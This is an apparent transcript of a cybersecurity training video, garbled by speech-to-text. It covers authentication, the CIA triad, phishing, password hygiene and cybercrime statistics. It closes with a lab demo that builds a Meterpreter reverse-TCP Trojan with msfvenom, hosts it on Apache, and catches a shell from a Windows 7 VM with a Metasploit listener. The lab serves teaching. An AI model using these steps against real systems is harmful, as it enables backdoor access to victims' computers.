people so for authorization we need to
identify them right so that's what I
Triple E does i stands for
identification if our authentication
authorization and the last a for
accountability even if I am authorized
to access that data I need to be held
accountable for the actions that have
taken so there would be logs that would
be created and stored to which we'll
keep track of what my activities have
been so if I do something malicious the
logs will point it out and even at a
later point in time someone can come in
and investigate and those logs would
tell them that something incorrect has
happened now coming back to
confidentiality when I say I authorized
a portion let's take an example of
onedrive again when we are talking about
authorization we say hey come to the
onedrive page now login when you say
login the first thing is you need to
identify yourself right you cannot just
type in a password and then the onedrive
scans their databases sees which
password matches which account and
throws that account in front of you it's
not going to happen that way so there
are two factors that come into the
picture here first is that you identify
which account you're talking about which
normally you identify by using either a
username or an email address or an
account ID for example your banks then
you're prompted for a password you type
in the correct password that is
associated with the username that you
have given in only then you're able to
sign in so it's a combination of both
these factors the username and the
password and it should match each other
in the database that has been stored
does the authentication happens so you
have now opened
have you identified you've proven that
you who you are and now the system then
goes in its database and sees what
you're authorized to access what access
controls have been implemented for you
to access or not access certain data now
this is where ACLs or access control
lists come into the picture so the
moment you access something it will
check whether you're authorized to
access it if yes you're allowed if no
you're denied you're given an error
saying you need to contact your
administrator if you want to access this
because currently your level of
authorization does not allow or does not
grant you access to this particular file
type now if I am allowed access and if
ax is that data then there is where the
trustworthiness of that data comes into
the picture the integrity of that data
so this data is being monitored either
by a data loss prevention system or a
integrity monitoring system like
tripwire where they constantly take on
hashes of the file and store it in a
secondary database so when the file is
modified the hash value would then be
modified or I would be prevented from
modifying it if I don't have that level
of authorization then comes the
availability we always we have been
taken the example of onedrive has it
ever been happened or has it ever
happened that onedrive wasn't not
available over the internet and any
point in time maybe a couple of times
well past few years but 99.9999% it's
always available so they ensure that the
data center that they have created is
redundant in such a way that no matter
what happens the data or the day on your
onedrive software and the service that
they're providing will always be made of
being able to you so here your business
continuity planning disaster recovery
planning change management service
management and all those would come into
the picture where you're going to create
a robust plan of how these things are
going to work together and make that
infrastructure available at all point in
time right let's move on to titling
cybercrime so what what do we mean by
cybercrime now again we in if you
remember a few slides back a few topics
back we talked about information
security and we talked about cyber
security and we talked about the
difference between both of them
information security could be about
anything normally contained within the
organization the data that the
organization has and us securing thus
data by introducing the
security controls that we talked about
cybersecurity would be something that is
on the internet or on the web so any web
application that have deployed on the
Internet any databases that I have that
would talk about cybersecurity so if
your Facebook account gets hacked or
your onedrive gets hacked
that's where cybersecurity comes into
the picture but if your physical
computer gets hacked because your
password got cracked by a physical
attack that's where your Information
Security is so some of the basic ways of
preventing cyber attacks on us use
unique and strong passwords we'll just
discuss the complexity of the passwords
we want to keep them random they should
not be guessable they should not be
based on dictionary words and they
should be randomized in such a way that
they cannot be predicted or guessed the
length of the password should be very
good should at least the minimum bare
minimum should be 8 characters even that
is not suggested in today's world it has
to be at least 12 to 16 characters an
operating system I think in today's
world will support up to 24 or 26
characters if you go into encryption
softwares this support up to 60 odd
characters of passwords so you want to
keep those unique you want to recycle
those passwords on a regular basis you
do not want to reuse old passwords again
and again avoid public Wi-Fi that's a
must we always look for free Wi-Fi we go
to coffee shops because they advertise
free Wi-Fi that's now it nowadays a
unique selling point for coffee shops
and establishments and we go there we
connect to the Wi-Fi because we get free
Internet and we get to surf whatever
will be born the problem is you have no
idea who else is connected to that Wi-Fi
and what kind of attacks they are
creating we would discuss Wi-Fi attacks
later on in one of the later videos but
I can demonstrate how these attacks work
but for now just remember that public
Wi-Fi is are very risky and if your
security is not up to the mark you might
just end up getting hacked like nobody's
business
ignore and delete mails from unknown
senders phishing attacks very common
attacks in today's world you get an
email saying you've won a lottery or
you've been chosen for something or
please don't click here to download your
free software and something like that
and those emails are plenty nowadays I
received an email yesterday where there
was a Nigerian prince who had died and
he
had left around 500 million dollars
behind and there was this accountant who
wanted to smuggle that money out and it
was a huge email giving me all the
details
and out of seven billion people on this
planet they identified my email address
and they wanted to share half the money
with me so that they can master it the
money and avoid paying taxes inheritance
taxes and whatnot it was a ridiculous
scheme I mean been chosen out of seven
billion one out of seven billion I mean
our luck can't be that good can it so
you have to be very about these attacks
always ask the question if you want a
lottery did you purchase the ticket No
so there's never a free lunch right so
always keep on questioning the things
that you've been getting I'm not saying
ignore them because some of them may
actually come true there's always that
1% hope but always investigate those
things to see whether there's Pam if
there is a fraud going on and if yes you
yourself can communicate with the law
enforcement agency and try to figure out
who is responsible for that fraud make
use of antivirus software and always
keep it updated again let's not go for
them free antivirus softwares because
they have they may be good at detecting
infections but when they come for their
disinfecting those files then that's
where they ask for money and that's when
you're going to run around and say okay
let me see which is the which is a very
good antivirus to disinfect this kind of
infection so there are a lot of
antivirus is out there I know that and
it's very confusing which is the best
one today now the problem is whichever
is the best one in the market may not be
the best one for the operating system
that you're using for example I mean
some there would be a good antivirus for
Windows 7 but the same antivirus
installed on Windows 8 or Windows 10
wouldn't be that effective so always do
an investigation the best way to look at
anti viruses and identifying which
antivirus suits you is to investigate
that antivirus and see the detection
rate of that antivirus see how often
does it differ detect the infections
that you're looking at what you can do
is you can head on to a website called
virustotal comm that's V I R Us T ot al
comm it's a Google own website they have
around 60 to 70 odd scanners on that
website most of the known antivirus
scanners are try to figure out try to
see if you can get hold of an infected
file be very careful you don't want to
get infected yourself or I mean your
computer you can upload it to that
particular website and analyze that file
and see which antivirus défi detects
those kind of viruses a few files are
few infections over here in there and
you will come to know which anti viruses
would work for you use multi-factor
authentication or two-step processes for
authentication just don't rely on a
username and password register devices
get OTP either on your email or on your
devices that gives you an added layer of
security if your password gets
compromised that's still okay because
now the hacker will need to simulate
your phone as well
so that's added headaches and it may
just not be worth it there are so many
other people who don't use these kind of
techniques who are who can be hacked
much easily than people who have an
added layer of security introduced and
be very careful when you're downloading
apps now when we say applications on
your mobile phones as well as on your
computers on your mobile phones you
still have a certain level of security
where you can go to the Apple
marketplace or whatever it is called the
Google Marketplace or whatever it is
called and they do have some level of
control but when you talk about Windows
operating systems and you're going on to
the open Internet to look for different
kinds of software's you have no idea
whether the website that you're on is
trustworthy or is hosted by a hacker
with a malware on that particular file
that you're downloading especially if
you are downloading a pirated program
never download a pirated program so be
very careful when you're downloading
apps when you're downloading an
executable file you can upload it to
virustotal dot exe scan it to see if
there are any viruses or malware within
it the website also helps you analyze
URLs to see if the URL itself may have
any malicious attacks within them
embedded scripts or redirect a script or
things like that so you can use those
with that website to scan scan the apps
that you're downloading and see if there
is anything malicious about those apps
moving on to cyber crime statistics now
this is going to be interesting let's
talk about how this thing's and the
person dead of these things in today's
world by 2020 we would have generated
300
ian's passwords now the human population
on this planet is 7 billion imagine
seven billion having 300 billion
passwords and I think have half the
population wouldn't have access to
computers or the Internet
either so imagine the number of
passwords that we have and that's what
makes us use easy passwords makes us
repeat those passwords and makes and we
use a single password for multiple
accounts right because there is just so
many passwords that we have to remember
but that's the way it is and if we want
to keep ourselves secure
we are responsible for it so please be
very careful with those passwords 24,000
malicious mobile apps blocked daily in
fact the latest example that I can give
give you I use an Android phone and
there's an application that I've always
used called camScanner and recently just
three days back my mobile phone started
telling me that it is a malicious app
right I've been using it for years now
probably three or four years maybe more
what is the software you can click
pictures of a document it will
automatically convert it it will be it
will beautify it if that's a word
converted into a PDF and it can then
send it as an attachment via email a
very handy app for me or was a handy app
for me it worked beautifully but three
days back suddenly the Android operating
system and my antivirus on my Android
phone started reporting it as a
malicious software so I went online and
I checked into it and it seemed that
over a period of time the developers
changed their vision of that software
made it spyware and then there was a
dropper involved within that application
which would then download a malware from
a third party server install it and
start spying on you and start showing
you malicious advertisements right so
this was an existing app which was
trusted over a period of years and over
a period of time slowly they modified it
into a spyware Kaspersky was an
organization that detected it in the
first place and then pointed it out to
Google Google took it off the Google
Play market and now there is a variant
of it available but if you look at the
reviews all of them are one-star that
they have identified that this is the
malware now and it spies on them
it actually compromised some people's
data so that's the latest example in
2017 or 18 there were 700,000 apps
during that year that were identified by
Google as malicious apps and were
deleted from Google Play so even if
they're published there will be
thousands of people who will download it
till the time Google realizes that it is
a malware and then they are deletes it
till then you've already been
compromised and there is no way to
protect yourself now so be very careful
when you download these applications in
the healthcare sector and somewhere
attacks will culturable now the
healthcare sector is a very volatile
sector it contains a lot of private and
sensitive information health information
about individuals that can be misused by
a lot of organizations advertisements
pharmaceutical organizations life
insurance people and whatnot right so
these become very lucrative targets for
hackers where if they can steal the
database and sell it on the black market
they will earn a lot of money ransomware
would basically work the other way
around to encrypt the data at the
hospital side and then they will hold
the hospital ransom to pay up now you
know how hospitals earn nowadays right
so that's a lot of money that we are
looking at cybercrime would cost up to
six trillion dollars in 2021 six
trillion dollars just for cybercrime
you're not talking about the income from
the IT industry you're talking about how
much money we will lose to cybercrime
because of the various attacks that we
that would be created ninety percent of
hackers use encryption not only
encryption most of that once hackers
will try to hide their identity by
spoofing their IP addresses MAC
addresses locations they will use
encryption and cryptography to hide
their malicious softwares to fool the
anti viruses IDS's IPSS and it would it
is a very difficult task to even
identify a particular malware analyze it
and then do a root cause analysis and
try to figure out who the responsible
hacker was so it's a very intensive task
of doing such things and most of the
hackers would go scot-free because it is
very difficult to identify them now
let's move on to the demo it's a very
interesting demo you're using Metasploit
which is a penetration testing tool and
you are going to use a demo of using
Metasploit you are going to try to
compromise the security of a particular
system well let's discuss the
before we start executing it so what we
have done here is that we have two
virtual machines on VMware Workstation
one is the Kali Linux machine and the
other is a Windows 7 machine what we are
going to do is we are going to use a
penetration testing tool called
Metasploit which is available free on
kali linux and you are going to use a
particular paid or generator on
Metasploit called msfv venom and using
MSF venom you are going to create a
backdoor a executable file which will
contain a Trojan or a backdoor and
you're going to try to infect that to
the Windows machine and see what happens
when the victim executes that particular
file now you're going to keep it at the
basic level you're just going to create
the Trojan and then you're going to
execute it in a later lecture or in a
later video we'll see how we can mask
that Trojan into a legitimate looking
application so that a victim can be
fooled by the application that you're
going to execute so let's start with the
demo all right so this is the Kali Linux
VM and the other machine is a windows 7
virtual machine so what we are going to
do is on the kali linux machine we are
going to just open up command prompt
right it's just regular command prompt
your like regular commands and what we
are going to do is we are going to use
the MSF venom payload generator from
Metasploit to create a game dot exe file
now the trojan is will be contained
within the game dot exe so the command
goes as such
MSF venom - be for platform we want it
or rather payload at this point in time
we won the payload to be windows made up
heater reverse underscore tcp l host and
IP address for the local hotel explain
the command once i've typed it let's
just check what our IP address for this
machine is and we have 192 168 71 dot
133 and that's what we're going to type
in here 192 168 71 or 133 Airport Oh 4 4
4 - f exe - a x86 and we want the output
in route desktop and we want it as game
dot exe
so let's go through the
command the msf venom is the initiator
command it invokes the prelude generator
in Metasploit - P is the payload we want
windows meterpreter reverse tcp so what
is the reverse tcp here the meter
praetor allows us for remote code
execution where we are going to create
the payload we are going to execute the
payload add the victims and and the
payload will then generate a connection
back to us as being the hackers machine
and thus the local host which is the IP
address of this machine which is the
hackers machine that we are using right
now which is 192 168 71 dot 133 that's
why we have typed in the local host and
L port is the local port on which port
do we want to listen in or we want the
pillow to connect to the local host so
what we're doing is the meter praetor
allows us remote code execution we
create the game not exe we execute it at
the victims end it does pre coded to
connect to a local host the IP address
is coded over there to a particular port
which in this case is 4 4 4 4 you can
put in any port number you want just
ensure that the port is going to be free
and it is not a regularly used port
otherwise you're going to get problems
over there so at this point in time
you're going to keep it as 4 4 4 4 - f
stands for function V what an executable
file - a stands for the architecture
here the architecture is 886 which is
x86 which is 32-bit and we are going to
export it and you're going to host it or
if you are going to here the file on
route desktop and you're logged in as
root as you can see at the prompt so
when I press ENTER I should see a game
dot exe popping up right about here on
my desktop if the command is correct
which it should be and that's game dot
exe wait for it to be compiled properly
so there you can see platform windows
for payload no encoder a payload size
33333 bytes and final size of executable
file is 73 thousand eight hundred and 0
802 bytes so now if you have created
game dot exe now if you are not going to
convert this into or we are not going to
merge this into a malware and things
like that you're going to keep it simple
so to keep it simple what I'm going to
do is as a hacker
I'm going to host this on a sir
which is going to be on the same machine
right so when we say we want to Huson
Apache server the server is hosted in a
directory called slash var var slash www
so let's go there present working
directory we can see that you're in root
CD ver dub dub dub and there we are CD
HTML and that is where our web servers
would be so what we are going to do is
we are going to create a directory mkdir
shared right to an LS and he can see the
shared folder right here LS - al will
give you the list and the attributes and
we can see these attributes if you want
to change this attribute so we are going
to use a chmod recursive command give
the permissions are seven five five to
the folder shared since we are in the
same directory we do not need to give
the path for shared let's just verify it
and you can see the permissions being
changed and now what you can do is we
are going to change the ownership from
root to www - data for the web hosting
so CH own for change ownership recursive
top top top - data : cup top table -
data to shared alright let's check if
that's been done properly and you can
see that earlier it was root root and
now it has dubbed up the - data table
table - data right and so that's the
directory that's that we have created
let's go back what we want to do is we
want to copy game dot exe into this
folder so CP group desktop came dot exe
where dub dub dub HTML shared and CD
shared let's see we have game not exe
right there there it is and now what we
want to do is service Apache to start so
essentially what we have done is we have
created a directory in the HTML folder -
who's this file and you've copied it
from our desktop into the shared folder
and I'm going to pause here for a minute
alright so we have started the service
for the Apache - server that means we
have started the web server we have
hosted the game dot exe on the web
server in the shared folder we have
changed the permissions and the
ownership for the shared folder now we
are going to go on to the
those seven machine and we are going to
open up the browser and see if the web
server is now accessible so if you
remember the IP address of that machine
was 192 dot 168 71 or 133 area but we
we're in the shared folder 92 168 71 dot
133 shared and if this is done properly
we should see the game dot exe right
here and once we click on it it's going
to ask us whether we want to save the
file
72.1 kb gonna save it and I'm going to
save it on I think it's just save it
here and now before we execute it you're
going to go back into Kali Linux and we
are now going to start the listener
right so if you've created the exploit
you created the preload rather we have
hosted it on to a web server which means
that when somebody double clicks on it
the machine is going to try to reboot in
a reverse connection to our hackers
machine but our hackers machine needs to
be configured to handle that incoming
connection so we are going to start off
with MSF console now MSF console is the
command which starts up Metasploit right
so we just want to take a minute over
here you can see it's Metasploit
framework control it's going to start
it's does take a little bit of a while
and we're just going to wait it out let
me turn this into full screen I can see
at the bottom left you're on MS Africans
on the MSF prompt we are using - Floyd
with 1699 exploits now this is not the
completely updated version the latest
one would have around 1800 exploits but
the one that we want is exists in this
version so they appear good to go so we
start off with the configuration of
Metasploit to listen in on to that
particular connection so we say use
exploit multi handler and when you say
Multi multi is basically something that
affects multiple operating system and
you're going to use that exploiting can
see it's now opening up the handler
which we need to configure and here
we're going to set the preload that it
is going to expect the payload being
Windows Meter praetor reverse underscore
TCP you can see that the payload has
been configured we are going to say show
options and you'll see it is going to
ask us options
for the payload which means the local
host the listen address and a listen
port they can see we had by default
given four four four four which is the
default port for this exploit within
Metasploit if you want to change if you
have changed the port when you created
game dot exe you need to change the port
over here as well and the commands here
that says set L host equals 192 dot 168
71 or 133 enter and I think I did a typo
so there's no equal to that's it and you
can see now it shows the equal to mark
and we have now set the local host if we
want to set the L port that's how we do
it we had 4 4 4 4 and there it is so if
you have changed the port in the game
dot exe and sure that you change the
port here as well show options and you
see now the data is populated over here
L host which is a local host is 192 168
71 dot 133 and L port the local port is
4 4 4 4 we have configured this and now
what we are going to do is we're just
going to type in exploit and now you can
see that it has started the reverse TCP
Handler on 192 168 71 dot 133 on port 4
4 4 4 so now when the victim which is
Windows 7 execute the file and we say
run add the victims and there's nothing
that should happen
it's just resolving something and at the
other end you can see that amid of
realization has been opened and it shows
us that from the victim's IP which is 71
dot 129 on port 4 9 4 9 3 we are
connected to our machine so there's
that's the connection that has happened
press ENTER and you can see it exists
exits the session let's just look at the
IP address on windows to confirm that
was the same machine that we had and
that's 129 right there it is let's open
up this file again and see what happens
and you can see the second session being
opened up right here to a PWD and you
can see that we were connected to that
particular website right so that's what
this Trojans
supposed to do give us a backdoor entry
and we then are able to connect and we
are able to copy data and you're able to
basically we have a back door so we can
do anything and everything that we want
to do and that my dear friends is the
demo for this particular session thank
you and I'll see you in the next video
hi there if you like this video
subscribe to the simple learn YouTube
channel and click here to watch similar
videos to nerd up and get certified
click here